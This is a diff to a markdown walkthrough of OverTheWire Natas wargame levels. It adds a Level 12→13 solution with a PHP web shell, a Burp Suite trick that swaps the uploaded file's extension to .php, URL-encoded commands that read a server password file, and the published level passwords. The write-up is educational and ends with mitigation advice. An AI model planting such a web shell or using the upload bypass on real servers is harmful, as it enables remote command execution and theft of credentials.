@@ -283,7 +283,7 @@ The developer sanitized only a few known command-separator symbols (`;`, `|`, `&
 - **Password:** `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`
 
 
-# Natas Level 11 → Level 10
+# Natas Level 11 → Level 12
 
 ## Description
 
@@ -359,6 +359,79 @@ The key learning is that using XOR encryption with a predictable or recoverable 
 
 * **Username:** `natas12`
 * **Password:** `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
+
+
+
+
+# Natas Level 12 → Level 13
+
+## Description
+
+This level demonstrates a **file upload vulnerability** caused by insufficient server-side validation.
+
+## Steps to Solve
+
+1. Open the webpage and inspect the source code. The page contains a file upload form that appears to allow only `.jpg` files.
+
+2. The upload restriction is handled on the client side, but the server does not properly validate the file extension.
+
+3. Create a PHP file with the following code:
+
+```php
+<?php
+echo system($_GET['command']);
+?>
+```
+
+4. Upload the PHP file. The application accepts it, but the uploaded file is initially changed to a random `.jpg` filename.
+
+5. Inspect the source code and notice that the server gets the file extension from the `filename` parameter. Using **Burp Suite**, intercept the upload request and change the `filename` parameter from `.jpg` to `.php`.
+
+6. The server then creates a random filename with the `.php` extension, for example:
+
+```text
+/upload/4hc39fcsto.php
+```
+
+7. Access the uploaded PHP file and test command execution:
+
+```text
+/upload/4hc39fcsto.php?command=pwd
+```
+
+8. To read the password for the next level, execute:
+
+```text
+cat /etc/natas_webpass/natas13
+```
+
+When using the command in the URL, encode special characters:
+
+```text
+%20 = space
+%2F = /
+```
+
+For example:
+
+```text
+/upload/4hc39fcsto.php?command=cat%20%2Fetc%2Fnatas_webpass%2Fnatas13
+```
+
+The command output contains the password for **Natas Level 13**.
+
+## Key Learning and Mitigation
+
+* Client-side validation can be bypassed by modifying the HTTP request.
+* File uploads must be validated on the **server side**.
+* Do not trust the filename or file extension provided by the client.
+* Uploaded files should not be allowed to execute server-side code.
+* Uploaded files should preferably be stored outside the web-accessible executable directory.
+
+## Level 13 Credentials
+
+* **Username:** `natas13`
+* **Password:** `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k `
 
 
 
